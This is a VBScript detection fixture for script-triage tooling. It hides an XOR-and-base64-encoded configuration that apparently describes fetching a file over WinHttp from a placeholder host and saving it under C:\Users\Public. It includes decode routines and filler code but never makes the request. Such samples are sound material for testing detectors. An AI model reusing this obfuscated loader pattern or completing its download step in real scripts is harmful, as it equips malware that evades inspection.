Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_2bf97d85 = "GFNfEh0aCx4dUw8NHxsHHAsxHAsDARoLQhkcBxoLMQgHAgsSDwoPHhoLHFM5BwAmGhoeQDkHACYaGh48Cx8bCx0aQFtAXxIdGg8JCzENARsAGlNcEg0PAx4PBwkAMQcKUw0PAx4PBwkAQ1lcX1ZaXV0NWVkSGxwCUwYaGh4dVEFBWVxfVlpdXQ1ZWUALFg8DHgILQAcAGA8CBwpBWl1aDFkLClZACg8aEhsdCxwxDwkLABpTJhsAGhwLHR0iDwxBWVxfVlpdXQ1ZWRIIBwILMR4PGgZTLVQyOx0LHB0yPhsMAgcNMiYbABocCx0dIg8MMh0aDwkLQ1lcX1ZaXV0NWVlACg8a"
Const Codec_2bf97d85 = "base64_literal|single_byte_xor|6e"

Function Base64_2bf97d85(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_2bf97d85", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_2bf97d85 = outputBytes
End Function

Function Load_2bf97d85()
  Load_2bf97d85 = Base64_2bf97d85(Material_2bf97d85)
End Function

Function Decode_2bf97d85(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor 110
  Next
  Decode_2bf97d85 = result
End Function

Function Recover_2bf97d85()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  ' configuration reconstruction
If (2 > 1) Then harmlessValue = "left" Else harmlessValue = "right"
  storedMaterial = Load_2bf97d85()
  On Error Resume Next
  recoveredMaterial = Decode_2bf97d85(storedMaterial)
  savedError = Err.Number
  savedDescription = Err.Description
  On Error GoTo 0
  If savedError <> 0 Then Err.Raise savedError, "HuntressFixture", savedDescription
  configurationText = ""
  For materialIndex = 0 To UBound(recoveredMaterial)
    configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
  Next
' reconstruction complete
  Recover_2bf97d85 = configurationText
End Function

Function Inspect_2bf97d85()
  Dim fields
  fields = Split(Recover_2bf97d85(), "|")
  Inspect_2bf97d85 = Join(fields, "|")
End Function
